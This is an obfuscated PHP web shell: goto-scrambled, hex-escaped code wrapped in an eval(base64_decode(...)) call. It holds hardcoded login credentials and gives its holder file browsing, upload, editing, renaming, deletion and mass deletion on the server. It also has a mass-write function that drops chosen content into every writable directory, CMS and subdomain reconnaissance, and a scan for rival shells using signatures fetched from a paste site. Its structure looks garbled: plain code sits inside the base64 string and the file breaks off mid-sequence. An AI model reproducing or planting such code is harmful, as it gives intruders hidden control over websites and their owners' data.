<?php eval(base64_decode('
 goto K9fDA; mfX_J: $pathParts = explode(DIRECTORY_SEPARATOR, trim($scanDir, DIRECTORY_SEPARATOR)); goto v4buR; YJkL3: $message = ''; goto dzSEo; hCf2p: function getServerInfo() { $server = $_SERVER["\123\105\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\122\105"] ?? ''; if (stripos($server, "\x61\x70\141\x63\x68\145") !== false) { return "\101\x70\x61\143\x68\x65"; } elseif (stripos($server, "\x6e\147\151\x6e\170") !== false) { return "\x4e\147\x69\x6e\x78"; } elseif (stripos($server, "\x69\x69\x73") !== false || stripos($server, "\155\151\143\162\x6f\x73\x6f\x66\x74") !== false) { return "\111\x49\123\40\x28\x57\151\156\x64\157\x77\x73\x29"; } elseif (stripos($server, "\x6c\x69\164\x65\x73\160\x65\x65\x64") !== false) { return "\114\x69\164\145\x53\x70\x65\x65\x64"; } else { return $server ?: "\125\x6e\x6b\156\157\167\x6e"; } } goto OyXAC; uMLU1: if ($action === "\144\x65\x65\160\137\x73\x63\141\x6e" && isset($deepResults)) { ?>
            <h3>Deep Scan Results</h3>
            <table>
                <tr><th>File</th><th>Detected Pattern</th><th>Type</th></tr>
                <?php  foreach ($deepResults as $r) { ?>
                    <tr>
                        <td><?php  echo htmlspecialchars($r["\146\151\x6c\x65"]); ?>
</td>
                        <td><code><?php  echo htmlspecialchars($r["\160\141\164\164\x65\x72\156"]); ?>
</code></td>
                        <td><strong><?php  echo htmlspecialchars($r["\164\x79\160\145"]); ?>
</strong></td>
                    </tr>
                <?php  } ?>
            </table>
        <?php  } goto bTRAD; fUy5_: $detectedCMS = detectCMS($scanDir, $cmsPatterns); goto SIyfM; cteGx: ?>
" onsubmit="return confirmMassDelete()">
        <div class="action-buttons">
            <button type="button" onclick="toggleCreateDir()">Create Directory</button>
            <button type="button" onclick="toggleCreateFile()">Create File</button>
            <button type="submit">Delete Selected</button>
        </div>
        
        <table>
            <tr>
                <th width="20"><input type="checkbox" onclick="selectAllFiles(this)"></th>
                <th>Name</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php  goto bYwuR; GRI40: function listDirectory($path) { $items = array(); if (!is_dir($path)) { return $items; } $parentDir = dirname($path); if ($parentDir !== $path) { $items[] = array("\x6e\x61\155\x65" => "\56\x2e", "\x70\141\164\150" => $parentDir, "\x69\x73\x44\x69\162" => true, "\163\151\x7a\x65" => "\x2d", "\155\x74\151\155\x65" => "\55", "\160\x65\162\155" => "\x2d"); } $iterator = new DirectoryIterator($path); foreach ($iterator as $fileInfo) { if ($fileInfo->isDot()) { continue; } $items[] = array("\x6e\141\x6d\x65" => $fileInfo->getFilename(), "\x70\141\164\x68" => $fileInfo->getPathname(), "\x69\163\104\151\162" => $fileInfo->isDir(), "\x73\151\172\x65" => $fileInfo->isDir() ? "\x2d" : formatSize($fileInfo->getSize()), "\x6d\x74\x69\155\x65" => date("\131\55\155\55\x64\40\110\72\151\72\x73", $fileInfo->getMTime()), "\x70\x65\162\155" => substr(sprintf("\45\157", $fileInfo->getPerms()), -4)); } return $items; } goto Hs9Ot; d_Rxt: function deepScanSuspiciousFiles($dir, $patterns, $maxFileSize, $shellSignatures) { $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); $results = array(); $deepPatterns = array_merge($patterns, $shellSignatures); foreach ($rii as $file) { if ($file->isDir()) { continue; } if ($file->getSize() > $maxFileSize) { continue; } $pathname = $file->getPathname(); $contents = @file_get_contents($pathname); if ($contents === false) { continue; } $title = ''; if (preg_match("\57\x3c\164\151\164\x6c\145\x5b\x5e\76\x5d\52\76\x28\x2e\x2a\x3f\x29\x3c\x5c\57\x74\x69\x74\154\x65\x3e\57\151\x73", $contents, $mtitle)) { $title = $mtitle[1]; } $urls = array(); if (preg_match_all("\x2f\50\x3f\x3a\x68\162\145\146\174\163\162\143\x29\134\x73\52\75\x5c\163\52\50\133\x22\x27\x5d\51\50\x2e\52\77\51\x5c\x31\57\151", $contents, $murls)) { foreach ($murls[2] as $u) { $urls[] = $u; } } if (preg_match_all("\57\x68\x74\x74\160\x73\77\72\134\57\x5c\57\133\136\134\163\x22\47\x5d\x2b\57\x69", $contents, $mplain)) { foreach ($mplain[0] as $u) { $urls[] = $u; } } $searchTarget = $title . "\xa" . implode("\xa", $urls) . "\12" . $contents; foreach ($deepPatterns as $pattern) { if (@preg_match("\x2f{$pattern}\57\151", $searchTarget)) { $results[] = array("\146\151\154\145" => $pathname, "\x70\141\164\x74\x65\162\156" => $pattern, "\x74\x79\160\145" => "\123\x48\x45\x4c\x4c\137\123\x49\x47\116\101\x54\x55\x52\105\137\x4f\122\x5f\120\101\124\124\x45\x52\x4e"); continue 2; } } if (preg_match("\x2f\x28\145\x76\x61\x6c\134\50\142\141\x73\x65\x36\64\137\144\x65\143\x6f\144\x65\134\x28\174\x65\x76\141\154\x5c\x28\147\x7a\x75\156\143\157\155\160\162\145\x73\x73\x5c\x28\174\x65\166\141\x6c\x5c\x28\147\x7a\x69\x6e\x66\x6c\x61\164\x65\134\50\x7c\x73\x74\162\137\x72\157\164\x31\x33\x5c\x28\174\134\x2e\x63\150\x72\x5c\50\134\144\53\134\51\51\57\x69", $contents)) { $results[] = array("\146\151\154\x65" => $pathname, "\x70\141\x74\x74\145\162\156" => "\x4f\x42\106\x55\123\103\x41\124\x45\104\137\103\x4f\x44\105", "\x74\x79\160\145" => "\104\x45\105\x50\137\117\102\106\x55\123\x43\101\x54\x49\117\x4e"); } if (preg_match("\x2f\x28\145\x76\141\154\56\52\x5c\x28\56\x2a\x5c\44\x5f\x28\x47\x45\x54\174\x50\117\x53\x54\x7c\x52\x45\121\125\x45\x53\x54\x29\56\52\134\x29\x7c\146\151\x6c\x65\x5f\x70\x75\164\x5f\x63\x6f\x6e\x74\x65\x6e\164\x73\56\52\134\44\137\50\107\105\x54\174\x50\117\x53\x54\x7c\x52\105\121\125\105\123\x54\x29\x29\57\x69", $contents)) { $results[] = array("\146\151\x6c\x65" => $pathname, "\160\141\164\x74\145\162\156" => "\123\125\123\x50\111\103\111\117\x55\x53\137\103\117\x4d\x42\111\x4e\x41\124\111\x4f\116", "\164\171\x70\x65" => "\104\x45\105\x50\x5f\103\117\x4d\102\x49\x4e\101\x54\111\117\x4e"); } } return $results; } goto xbVmF; oeK2v: echo urlencode($scanDir); goto elh3e; JwyVr: if ($action === "\x72\x65\156\x61\155\145" && isset($_POST["\157\154\144\156\x61\x6d\145"], $_POST["\156\x65\167\156\141\x6d\x65"])) { if (rename($_POST["\x6f\154\x64\156\x61\155\x65"], $_POST["\x6e\145\x77\156\141\155\145"])) { $message = "\x46\x69\x6c\145\x20\x72\145\x6e\141\x6d\145\x64\56"; } else { $message = "\x52\x65\156\x61\x6d\145\x20\146\x61\x69\154\145\144\x2e"; } } goto YJjjB; KcRqh: ?>
" class="nav-dir">Root</a>
        <?php  goto kNj_S; bcSoI: if ($action === "\155\141\163\163\137\x64\x65\x6c\145\x74\x65" && isset($_POST["\146\151\154\145\x73"])) { $deletedCount = 0; foreach ($_POST["\146\151\154\145\163"] as $file) { if (file_exists($file)) { if (is_dir($file)) { if (deleteRecursive($file)) { $deletedCount++; } } else { if (unlink($file)) { $deletedCount++; } } } } $message = "\104\145\154\145\164\145\x64\x20{$deletedCount}\40\x69\x74\x65\x6d\163\56"; } goto EabDm; Iu21c: ?>
" required>
            </label><br><br>
            <input type="file" name="upload">
            <button type="submit">Upload</button>
        </form>
    </div>

    <?php  goto P8NoN; y6zQA: foreach ($recentFiles as $f) { ?>
            <tr>
                <td><?php  echo htmlspecialchars($f["\146\x69\154\x65"]); ?>
</td>
                <td><?php  echo $f["\x73\151\172\145"]; ?>
</td>
                <td><?php  echo $f["\155\x74\151\155\x65"]; ?>
</td>
                <td><?php  echo colorPerm($f["\160\145\162\155"]); ?>
</td>
                <td>
                    <form method="get" action="" style="display:inline">
                        <input type="hidden" name="action" value="edit">
                        <input type="hidden" name="filepath" value="<?php  echo htmlspecialchars($f["\146\151\x6c\145"]); ?>
">
                        <input type="hidden" name="path" value="<?php  echo htmlspecialchars($scanDir); ?>
">
                        <button type="submit">Edit</button>
                    </form>
                    <form method="post" action="?action=rename&path=<?php  echo urlencode($scanDir); ?>
" style="display:inline">
                        <input type="hidden" name="oldname" value="<?php  echo htmlspecialchars($f["\146\151\x6c\145"]); ?>
">
                        <input type="text" name="newname" placeholder="New name" style="width: 120px;">
                        <button type="submit">Rename</button>
                    </form>
                    <form method="post" action="?action=delete&path=<?php  echo urlencode($scanDir); ?>
" style="display:inline" onsubmit="return confirmDelete()">
                        <input type="hidden" name="filepath" value="<?php  echo htmlspecialchars($f["\146\x69\x6c\x65"]); ?>
">
                        <button type="submit">Delete</button>
                    </form>
                </td>
            </tr>
        <?php  } goto HNflV; F7Wv0: ?>
    </table>

    <h2>Recent files / uploaded in last 7 days</h2>
    <table>
        <tr><th>File</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th></tr>
        <?php  goto y6zQA; b3I6H: ?>
">
            <button type="submit" class="deep-scan-button">🚨 RUN DEEP SCAN 🚨</button>
        </form>
        
        <?php  goto uMLU1; Wtyhm: function scanSubdomains($domain) { $commonSubdomains = array("\167\x77\167", "\155\141\x69\x6c", "\146\164\160", "\x6c\x6f\143\x61\154\x68\x6f\x73\164", "\167\145\x62\155\x61\151\154", "\163\x6d\164\x70", "\x70\157\x70", "\x6e\x73\x31", "\x6e\x73\x32", "\143\160\x61\x6e\145\x6c", "\x77\x68\x6d", "\141\x75\x74\x6f\144\x69\x73\x63\157\x76\145\x72", "\x61\x75\164\157\143\157\x6e\146\x69\147", "\x6d", "\151\x6d\141\x70", "\164\145\x73\164", "\x62\154\157\147", "\144\x65\x76", "\144\145\x76\x65\154\x6f\x70\155\x65\x6e\x74", "\x73\x74\141\x67\x69\x6e\x67", "\141\160\151", "\141\x64\155\151\x6e", "\x64\141\x73\150\x62\x6f\141\162\144", "\163\x65\143\x75\x72\x65", "\166\x70\x6e", "\x6d\157\x62\151\154\145", "\x73\x68\157\x70", "\x73\x74\157\162\145", "\146\x6f\162\x75\155", "\x73\x75\x70\160\x6f\x72\164", "\150\145\x6c\160", "\x77\x65\142\x64\151\163\x6b", "\x64\151\162\145\x63\x74", "\x64\151\x72\145\x63\x74\55\x63\157\156\x6e\x65\x63\x74", "\x68\164\x74\160", "\150\x74\164\x70\163"); $foundSubdomains = array(); foreach ($commonSubdomains as $subdomain) { $host = $subdomain . "\56" . $domain; if (gethostbyname($host) != $host) { $foundSubdomains[] = $host; } if ($subdomain === "\150\164\x74\x70" || $subdomain === "\x68\164\x74\x70\163") { $foundSubdomains[] = "\x68\164\164\x70\72\57\57" . $host; $foundSubdomains[] = "\150\x74\x74\160\163\x3a\x2f\57" . $host; } } return $foundSubdomains; } goto GRI40; qCHhw: $allFiles = listFiles($scanDir); goto J2FOT; e6HTM: ?>
">
            <label>Directory Path:<br><input type="text" name="dirpath" value="<?php  goto HXt0P; FzG8i: function detectCMS($dir, $cmsPatterns) { $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); $detectedCMS = array(); foreach ($rii as $file) { if ($file->isDir()) { continue; } $filename = $file->getFilename(); $path = $file->getPathname(); $content = @file_get_contents($path); if ($content === false) { continue; } foreach ($cmsPatterns as $cms => $pattern) { if (preg_match($pattern, $content) || preg_match($pattern, $path) || preg_match($pattern, $filename)) { if (!in_array($cms, $detectedCMS)) { $detectedCMS[] = $cms; } } } if (count($detectedCMS) >= 3) { break; } } return !empty($detectedCMS) ? implode("\54\40", $detectedCMS) : "\x55\116\113\116\117\127\116"; } goto hCf2p; ahrxC: $patterns = array("\57\x65\166\141\154\x5c\163\52\134\x28\x2e\52\134\51\x2f\151", "\57\142\141\163\x65\x36\64\137\144\x65\x63\x6f\x64\145\x5c\x73\x2a\134\x28\x2e\52\x5c\51\x2f\x69", "\x2f\163\x68\x65\154\154\137\145\x78\x65\x63\x5c\163\52\134\50\56\x2a\134\51\x2f\x69", "\57\x70\x61\163\163\164\150\x72\165\x5c\163\x2a\x5c\50\x2e\52\x5c\51\57\151", "\x2f\x65\x78\145\x63\134\x73\52\x5c\50\56\x2a\134\x29\x2f\x69", "\x2f\74\x66\157\162\155\x5c\163\x2b\145\156\x63\x74\x79\160\x65\75\133\x22\x27\x5d\x6d\x75\x6c\164\x69\x70\141\x72\164\x5c\57\146\157\162\155\55\144\141\164\x61\x5b\x22\x27\x5d\134\x73\x2b\x6d\145\x74\150\x6f\144\x3d\133\x22\47\135\x50\x4f\x53\124\133\x22\x27\x5d\133\x5e\76\135\52\x3e\57\x69", "\57\x63\165\x72\154\x5f\145\x78\145\143\x5c\163\52\134\50\56\52\x5c\51\x2f\151", "\x2f\x66\151\x6c\x65\137\160\x75\x74\137\x63\x6f\156\x74\x65\156\164\x73\x5c\x73\x2a\x5c\50\56\x2a\134\51\57\151", "\x2f\155\x6f\166\145\x5f\x75\160\x6c\157\x61\144\x65\144\x5f\146\x69\154\145\134\x73\52\134\x28\56\x2a\134\x29\x2f\151", "\x2f\134\x24\137\137\106\111\114\x45\x5f\x5f\57", "\57\x70\x72\157\x63\137\157\x70\145\156\134\x73\52\134\50\56\x2a\134\x29\x2f\x69", "\57\160\157\160\145\x6e\x5c\x73\52\x5c\x28\x2e\x2a\x5c\x29\57\151", "\x2f\163\x79\x73\164\x65\x6d\134\163\x2a\x5c\x28\x2e\x2a\134\x29\57\x69", "\57\145\166\141\x6c\x5c\x73\x2a\x5c\50\134\x73\52\147\x7a\165\x6e\143\x6f\x6d\x70\162\145\x73\163\134\x73\52\x5c\x28\56\52\134\x29\134\163\52\134\x29\57\151", "\57\x69\156\143\154\x75\x64\x65\134\x73\x2a\134\50\x2e\52\134\51\57\x69", "\x2f\x72\x65\161\x75\151\x72\145\x5c\x73\x2a\x5c\x28\56\x2a\x5c\51\57\151", "\57\145\x76\141\x6c\x5c\163\52\x5c\50\134\163\52\x62\141\x73\x65\x36\x34\137\x64\145\x63\x6f\x64\x65\134\x73\52\x5c\x28\x2e\x2a\x5c\x29\x5c\163\x2a\x5c\51\x2f\151", "\57\145\166\x61\154\134\x73\x2a\x5c\50\134\163\52\150\x74\x6d\x6c\x73\160\x65\143\x69\141\154\x63\150\x61\162\x73\137\x64\145\x63\x6f\144\x65\x5c\163\52\134\x28\56\x2a\134\x29\x5c\163\52\134\51\x2f\x69", "\57\145\166\x61\154\x5c\163\x2a\x5c\50\x5c\163\x2a\x67\x7a\151\156\x66\154\141\164\x65\x5c\163\x2a\x5c\x28\56\52\134\x29\x5c\163\52\x5c\51\x2f\x69", "\x2f\163\145\164\x5f\x74\151\x6d\x65\x5f\x6c\151\x6d\151\x74\x5c\163\x2a\134\50\56\x2a\x5c\51\57\x69", "\57\x68\x65\x61\144\x65\162\134\x73\52\x5c\x28\x5c\x73\x2a\42\x58\x2d\130\123\x53\x2d\120\162\x6f\164\145\x63\x74\151\x6f\x6e\x3a\134\163\x2a\x30\x22\134\163\x2a\x5c\51\x2f\x69", "\57\x70\x63\156\x74\x6c\x5f\x65\170\145\143\134\x73\x2a\134\50\56\52\x5c\51\x2f\x69", "\x2f\x28\x3f\74\41\133\101\55\132\141\55\172\x30\55\71\x5f\135\x29\x5f\137\x68\141\154\164\x5f\143\x6f\x6d\x70\x69\154\145\162\50\77\41\133\101\55\x5a\141\55\172\60\x2d\71\137\x5d\x29\57", "\57\x61\163\x73\145\162\x74\x5c\x73\52\x5c\50\x2e\x2a\x5c\51\x2f\151", "\57\x70\x72\x65\147\x5f\x72\145\x70\154\141\143\x65\134\163\x2a\x5c\x28\x2e\53\x5c\x2f\x65\x2e\x2a\134\51\57\151", "\57\74\134\x3f\x70\150\160\134\163\x2b\x65\143\150\157\x5c\163\53\140\56\x2a\140\73\x2f\x69", "\57\x66\167\x72\x69\x74\x65\134\x73\x2a\x5c\50\x2e\52\x5c\x29\57\151", "\x2f\x66\157\160\x65\x6e\x5c\163\x2a\x5c\50\56\x2a\134\x29\57\151", "\x2f\x65\x72\x72\157\162\137\x72\145\160\x6f\162\x74\151\x6e\x67\x5c\163\x2a\134\x28\x2e\52\x5c\51\57\151", "\57\x63\150\x6d\157\144\x5c\163\53\x5b\60\x2d\x37\x5d\173\x33\54\x34\x7d\57\151", "\x2f\x63\x68\157\167\x6e\134\163\53\134\x77\53\72\134\x77\53\57\x69", "\57\x30\x36\x34\x34\57", "\57\x30\67\x35\65\57", "\x2f\64\x34\64\64\57", "\57\x3c\151\156\x70\165\x74\x5b\136\76\135\52\x74\171\160\x65\75\133\x22\x27\x5d\146\151\x6c\x65\133\42\47\135\x2f\151", "\57\74\x69\156\160\x75\164\x5b\136\x3e\x5d\52\164\x79\160\145\75\133\x22\47\135\x62\x75\164\x74\x6f\156\133\42\47\135\x2e\x2a\166\x61\x6c\165\145\x3d\133\x22\x27\135\165\x70\x6c\157\x61\x64\x5b\x22\47\135\57\151", "\x2f\x40\x69\156\151\x5f\163\x65\x74\x5c\x73\52\x5c\x28\134\x73\52\x5b\x22\x27\x5d\x64\151\x73\160\154\141\171\137\145\162\x72\157\162\x73\133\x22\x27\x5d\134\x73\x2a\54\x5c\163\52\60\x5c\163\52\x5c\51\x2f\x69"); goto grofu; FX6dh: ?>
        </table>
    </form>
    
    <!-- Create Directory Form -->
    <div id="create-dir" class="form-box" style="display: none;">
        <h2>Create New Directory</h2>
        <form method="post" action="?action=create_dir&path=<?php  goto tEYwB; B9Xx_: $fileCount = countFiles($scanDir); goto L25L7; XZpeD: if ($action === "\165\160\x6c\157\141\144" && isset($_FILES["\x75\160\x6c\x6f\141\x64"])) { $uploadDir = $_POST["\165\160\x6c\x6f\x61\144\x5f\144\151\x72"] ?? $scanDir; $uploadDir = realpath($uploadDir) ?: $scanDir; $dest = $uploadDir . "\57" . basename($_FILES["\165\x70\x6c\157\x61\x64"]["\156\x61\155\145"]); if (move_uploaded_file($_FILES["\x75\160\154\157\141\144"]["\164\x6d\160\137\x6e\141\155\145"], $dest)) { $message = "\106\151\154\x65\x20\x75\160\154\x6f\x61\x64\145\x64\x20\x74\157\x20{$dest}"; } else { $message = "\125\160\154\157\141\144\x20\146\141\x69\x6c\145\144\x2e"; } } goto PS_xU; q7xyt: $scanDir = isset($_GET["\x70\x61\164\150"]) ? $_GET["\160\141\x74\x68"] : (isset($_POST["\160\141\x74\150"]) ? $_POST["\x70\141\164\150"] : __DIR__); goto qAfxJ; Hb0Xk: echo htmlspecialchars($detectedCMS); goto mbymf; ncs7S: if (!isset($_SESSION["\x6c\157\x67\x67\145\x64\151\x6e"]) || $_SESSION["\x6c\157\147\147\145\x64\151\156"] !== true) { if ($_SERVER["\x52\x45\121\125\x45\x53\x54\x5f\115\105\124\x48\117\104"] === "\120\x4f\123\124" && isset($_POST["\165\163\145\162\156\x61\x6d\145"], $_POST["\160\x61\x73\x73\x77\157\x72\144"])) { $username = $_POST["\165\x73\x65\162\156\x61\x6d\145"]; $password = $_POST["\160\x61\x73\x73\167\x6f\x72\x64"]; if ($username === $validCredentials["\165\163\x65\162\156\x61\155\x65"] && $password === $validCredentials["\x70\141\163\163\x77\157\162\144"]) { $_SESSION["\154\157\x67\147\145\144\151\156"] = true; $_SESSION["\165\163\145\162\156\x61\155\x65"] = $username; header("\x4c\157\143\141\164\151\x6f\x6e\72\40" . $_SERVER["\x50\110\120\x5f\x53\105\x4c\106"]); die; } else { $loginError = "\x49\156\x76\141\154\151\x64\40\x75\x73\145\x72\156\x61\x6d\145\40\157\162\x20\x70\x61\x73\163\167\x6f\x72\144\x21"; } } displayLoginPage($loginError ?? ''); die; } goto q7xyt; K9aCa: function fetchShellSignatures() { $url = "\150\164\164\160\x73\72\57\x2f\152\165\x73\164\160\141\x73\x74\145\x2e\x69\x74\x2f\61\x6e\147\x38\145"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_USERAGENT, "\x4d\x6f\x7a\151\x6c\x6c\141\57\65\56\60\x20\50\x57\x69\x6e\x64\157\x77\163\40\x4e\124\40\x31\60\56\x30\x3b\40\x57\151\156\66\x34\x3b\40\x78\x36\x34\51\40\x41\x70\x70\x6c\x65\127\145\x62\113\x69\164\x2f\x35\63\67\56\63\66\40\x28\x4b\x48\124\115\114\x2c\40\154\151\153\x65\40\107\x65\143\x6b\157\51\40\103\150\x72\157\x6d\x65\57\x39\61\x2e\60\x2e\x34\64\67\x32\56\x31\x32\x34\x20\x53\141\146\x61\x72\x69\x2f\65\x33\x37\x2e\63\66"); $response = curl_exec($ch); curl_close($ch); if ($response) { if (preg_match("\57\x3c\x70\162\145\133\136\x3e\x5d\x2a\x3e\50\x2e\x2a\77\51\x3c\134\57\160\x72\145\x3e\57\151\x73", $response, $matches) || preg_match("\57\74\x63\x6f\x64\x65\133\x5e\76\x5d\52\x3e\50\x2e\52\77\x29\x3c\134\x2f\x63\157\x64\145\76\x2f\x69\x73", $response, $matches)) { $content = $matches[1]; $lines = explode("\xa", $content); $signatures = array(); foreach ($lines as $line) { $line = trim(html_entity_decode(strip_tags($line))); if (preg_match("\57\50\145\x76\141\154\x7c\142\141\x73\x65\x36\x34\x5f\144\x65\143\157\144\145\174\x73\150\145\x6c\154\137\x65\x78\x65\143\174\x73\x79\x73\x74\145\x6d\x7c\160\141\163\163\x74\150\x72\165\174\145\x78\145\143\174\141\x73\x73\145\x72\x74\174\160\x72\x65\147\x5f\162\145\160\x6c\x61\143\145\56\x2a\x5c\57\x65\x29\57\151", $line) || preg_match("\57\134\x24\137\50\107\105\x54\x7c\x50\117\x53\x54\x7c\122\x45\x51\125\x45\x53\124\174\x43\117\x4f\113\x49\105\51\x5c\x5b\x2e\52\134\x5d\x2f\151", $line) || preg_match("\57\74\134\x3f\x28\160\150\x70\51\77\x5c\x73\x2a\x28\x2e\52\x29\x5c\77\76\57\151", $line) || strlen($line) > 10) { $cleanLine = preg_replace("\57\x5b\x5e\134\x78\x32\60\x2d\134\170\x37\105\135\x2f", '', $line); if (!empty($cleanLine)) { $signatures[] = preg_quote($cleanLine, "\x2f"); } } } return array_slice(array_unique($signatures), 0, 50); } } return array("\x65\166\141\x6c\x5c\50\x5c\x24\137\120\x4f\x53\124\x5c\133\x2e\x2a\x5c\135\134\51", "\x62\141\163\x65\x36\x34\x5f\144\145\x63\157\x64\x65\x5c\x28\x5c\44\x5f\120\117\x53\124\x5c\133\x2e\52\134\135\x5c\51", "\x73\x79\163\164\x65\x6d\134\50\134\44\137\107\x45\124\134\133\56\52\x5c\x5d\134\51", "\141\163\x73\145\x72\x74\x5c\50\134\44\x5f\122\x45\x51\125\x45\x53\124\134\133\56\52\134\x5d\134\x29", "\160\x61\x73\163\x74\150\162\165\134\x28\134\x24\137\120\117\123\x54\134\133\x2e\x2a\x5c\135\134\51", "\x65\x78\145\143\x5c\x28\134\44\137\x47\x45\x54\134\x5b\56\52\134\135\x5c\x29", "\x73\x68\x65\x6c\x6c\137\x65\x78\145\x63\134\50\134\44\137\120\117\123\x54\x5c\133\x2e\52\x5c\x5d\x5c\x29", "\x70\x72\145\x67\137\x72\145\160\x6c\x61\143\x65\x5c\x28\47\x2e\52\x5c\x2f\145\x2e\52\47\134\x2c\47\56\x2a\x27\x5c\x29", "\x65\x63\x68\x6f\134\163\52\x60\x2e\52\x5c\x24\x2e\52\x60", "\146\167\x72\151\x74\x65\134\50\x66\157\160\x65\156\134\x28\56\52\134\42\56\x2a\x5c\x22\x5c\56\x2a\134\51\134\51", "\145\x76\141\x6c\134\x28\x67\172\x75\156\x63\157\x6d\160\x72\x65\163\163\134\50\x2e\52\x5c\51\134\51", "\145\x76\141\154\134\50\142\x61\163\x65\66\x34\x5f\x64\x65\143\x6f\x64\145\x5c\50\56\52\134\x29\134\51", "\145\166\141\154\x5c\x28\x5c\44\137\x52\105\x51\x55\105\x53\124\134\133\x2e\52\x5c\x5d\134\51", "\x66\x69\154\x65\137\x70\165\164\137\x63\157\156\164\x65\156\x74\163\134\x28\x2e\52\x5c\44\56\52\x5c\x29", "\x63\162\x65\141\x74\145\137\x66\165\x6e\143\x74\x69\x6f\156\x5c\x28\x2e\x2a\x5c\x24\56\x2a\134\x29", "\x63\x61\x6c\154\137\165\163\x65\x72\x5f\x66\x75\x6e\143\134\50\x2e\52\134\x24\56\52\x5c\x29", "\141\162\x72\x61\x79\137\x6d\141\x70\x5c\50\56\x2a\x5c\44\56\52\x5c\x29", "\134\44\170\x5c\163\x2a\x3d\x5c\163\x2a\134\44\137\50\107\105\x54\174\120\x4f\x53\124\x7c\122\x45\x51\x55\105\x53\x54\x29\134\x5b\56\x2a\134\135\56\52\145\x76\141\154\134\50\x5c\x24\x78\134\x29", "\151\x6e\x63\x6c\165\x64\145\x5c\x28\x5c\44\137\x28\x47\105\x54\x7c\x50\x4f\123\124\174\x52\x45\121\x55\105\x53\x54\51\x5c\x5b\x2e\x2a\x5c\135\x5c\x29", "\x72\145\161\165\x69\x72\145\x5c\x28\134\x24\137\50\107\105\124\174\120\117\x53\x54\x7c\122\x45\x51\125\105\123\x54\51\134\x5b\x2e\x2a\134\x5d\134\x29"); } goto mwy_c; xbVmF: function detectRecentFiles($dir, $days = 7) { $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); $recent = array(); $threshold = time() - $days * 24 * 60 * 60; foreach ($rii as $file) { if ($file->isDir()) { continue; } if ($file->getMTime() >= $threshold) { $recent[] = array("\146\151\154\145" => $file->getPathname(), "\163\151\172\145" => $file->getSize(), "\x6d\164\x69\x6d\x65" => date("\x59\55\155\x2d\144\40\x48\72\x69\x3a\x73", $file->getMTime()), "\160\145\162\155" => substr(sprintf("\x25\157", $file->getPerms()), -4)); } } return $recent; } goto FL_uN; d2A_R: ?>
    </div>

    <!-- Deep Scan Button -->
    <div class="form-box">
        <h2>Deep Scan (Shell Detection)</h2>
        <p>Deep scan will examine files using external shell signatures and deeper heuristics across title, URLs, body and source code.</p>
        <form method="post" action="?action=deep_scan&path=<?php  goto nexD5; qAfxJ: $scanDir = realpath($scanDir) ?: __DIR__; goto h6PQU; mYHeQ: ?>
    
    <!-- Directory Navigation -->
    <div class="path-nav">
        <strong>Current Path:</strong> 
        <a href="?path=<?php  goto Lb5Q4; P8NoN: if ($action === "\145\x64\x69\164" && isset($_GET["\x66\151\x6c\x65\160\141\x74\x68"])) { $content = @file_get_contents($_GET["\x66\x69\x6c\145\x70\x61\x74\150"]); ?>
        <div class="form-box">
            <h2>Edit File: <?php  echo htmlspecialchars($_GET["\146\151\x6c\x65\160\x61\164\150"]); ?>
</h2>
            <form method="post" action="?action=save_edit&path=<?php  echo urlencode($scanDir); ?>
">
                <input type="hidden" name="filepath" value="<?php  echo htmlspecialchars($_GET["\x66\x69\154\x65\x70\x61\164\x68"]); ?>
">
                <textarea name="content"><?php  echo htmlspecialchars($content); ?>
</textarea>
                <button type="submit">Save</button>
            </form>
        </div>
    <?php  } goto Zyq11; upGak: if ($action === "\x73\x63\x61\x6e\x5f\x64\x6f\155\141\151\156" && isset($subdomains)) { ?>
            <div style="margin-top: 15px;">
                <h3>Subdomain Scan Results for <?php  echo htmlspecialchars($domain); ?>
</h3>
                <?php  if (!empty($subdomains)) { ?>
                    <button onclick="toggleSubdomains()">Show/Hide Subdomains</button>
                    <div id="subdomains-list" class="subdomain-list" style="display: none;">
                        <ul>
                            <?php  foreach ($subdomains as $sub) { ?>
                                <li><?php  echo htmlspecialchars($sub); ?>
</li>
                            <?php  } ?>
                        </ul>
                    </div>
                <?php  } else { ?>
                    <p>No common subdomains found.</p>
                <?php  } ?>
            </div>
        <?php  } goto d2A_R; eijWh: echo htmlspecialchars($domain); goto uM66L; kNj_S: foreach ($pathNav as $part) { ?>
            / <a href="?path=<?php  echo urlencode($part["\160\141\x74\150"]); ?>
" class="nav-dir"><?php  echo htmlspecialchars($part["\x6e\141\x6d\145"]); ?>
</a>
        <?php  } goto UImy8; MR4Mi: echo htmlspecialchars($_SESSION["\165\163\145\162\156\141\155\145"]); goto ED6Sz; Y1zIN: ?>
        </div>
        <div class="info-item">
            <span class="info-label">Server:</span> <?php  goto Cnln9; lXx4r: echo htmlspecialchars($scanDir); goto pYPaU; UGYVL: $validCredentials = array("\165\x73\x65\x72\156\141\x6d\145" => "\164\x6f\155\x6f\x64\141\x63\x68\151\x70\162\x6f", "\160\141\163\x73\x77\157\162\x64" => "\x74\157\155\x6f\144\x61\x63\150\151\x76\151\160\62\x30\63\60\x21"); goto ncs7S; EabDm: if ($action === "\x6d\141\x73\x73\x5f\145\144\x69\164" && isset($_POST["\x64\x69\x72\x70\141\164\150"], $_POST["\x66\x69\154\x65\156\x61\155\x65"], $_POST["\x63\157\156\164\145\x6e\164"])) { $targetDir = $_POST["\x64\151\x72\160\x61\x74\150"]; $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir)); $count = 0; foreach ($rii as $file) { if ($file->isDir()) { $newFile = $file->getPathname() . "\57" . $_POST["\146\151\154\x65\x6e\141\155\x65"]; if (is_writable($file->getPathname()) || !file_exists($newFile) && is_writable($file->getPathname())) { if (file_put_contents($newFile, $_POST["\x63\x6f\156\x74\x65\156\x74"]) !== false) { $count++; } } } } $message = "\x4d\x61\163\163\40\x65\x64\x69\x74\x20\143\x72\145\141\164\145\144\x2f\165\x70\x64\x61\x74\145\144\40{$_POST["\146\x69\154\145\x6e\x61\155\x65"]}\40\151\x6e\40{$count}\x20\x64\x69\x72\x65\143\164\157\x72\151\x65\163\x2e"; } goto WTly9; 